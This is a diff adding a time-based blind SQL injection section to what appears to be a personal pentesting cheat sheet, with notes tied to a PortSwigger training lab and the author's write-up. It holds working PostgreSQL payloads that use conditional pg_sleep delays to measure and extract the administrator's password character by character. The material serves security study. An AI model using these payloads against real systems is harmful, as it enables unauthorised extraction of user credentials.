@@ -391,6 +391,23 @@ Time based (Postgre):
 ' OR pg_sleep(5) -- -
 ```
 
+##### Time based, enumeration
+
+Try conditional delay payloads from [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
+
+Determine the length:
+```sql
+1'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+from+users--+-
+```
+
+Enumerate the password:
+```sql
+1'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+from+users--+-
+```
+
+[Lab: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
+[My Writeup](https://juntakemura.dev/portswigger-sqli-time-delay/)
+
 ##### Filter bypass via base64 encoding
 
 ```js
